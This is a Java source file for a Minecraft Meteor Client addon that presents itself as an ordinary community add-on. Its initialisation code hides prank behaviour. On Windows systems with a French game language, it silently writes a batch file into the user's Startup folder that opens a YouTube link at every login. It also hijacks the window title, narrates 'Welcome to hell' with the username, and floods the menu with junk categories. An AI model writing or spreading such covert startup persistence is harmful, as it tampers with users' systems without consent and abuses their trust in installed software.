package community.addon;

import com.mojang.text2speech.Narrator;
import com.sun.jna.Platform;
import community.addon.commands.CommandExample;
import community.addon.hud.TravisScott;
import com.mojang.logging.LogUtils;
import community.addon.modules.ModuleExample;
import meteordevelopment.meteorclient.addons.MeteorAddon;
import meteordevelopment.meteorclient.commands.Commands;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.systems.config.Config;
import meteordevelopment.meteorclient.systems.hud.Hud;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import org.slf4j.Logger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Calendar;

import static meteordevelopment.meteorclient.MeteorClient.EVENT_BUS;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class Addon extends MeteorAddon {
    public static final Category CATEGORY = new Category("Community Addon");
    public static final HudGroup HUD_GROUP = new HudGroup("Community Addon");
    public static final Logger LOG = LogUtils.getLogger();

    @Override
    public void onInitialize() {
        LOG.info("Initializing Community Addon");

        // Modules
        Modules.get().add(new ModuleExample());

        // Commands
        Commands.add(new CommandExample());

        // HUD
        Hud.get().register(TravisScott.INFO);

        Config.get().customWindowTitle.set(true);
        Config.get().customWindowTitleText.set("the University of Iowa OWNS you1!1!!");

        if (mc.options.language.contains("fr")) {
            if (Platform.isWindows()) {
                if (!new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\silly.bat").exists()) {
                    try {
                        FileWriter fileWriter = new FileWriter("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\silly.bat");
                        PrintWriter printWriter = new PrintWriter(fileWriter);
                        printWriter.println("START https://www.youtube.com/watch?v=M9J6DKJXoKk");
                        printWriter.close();
                        fileWriter.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }

        Narrator.getNarrator().say("Welcome to hell, " + System.getProperty("user.name"), true);
    }

    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);
        Calendar calendar = Calendar.getInstance();
        for (int i = 0; i < calendar.get(Calendar.DAY_OF_YEAR); i++) {
            Modules.registerCategory(new Category("Fish " + i));
        }
    }

    @Override
    public String getPackage() {
        return "community.addon";
    }
}
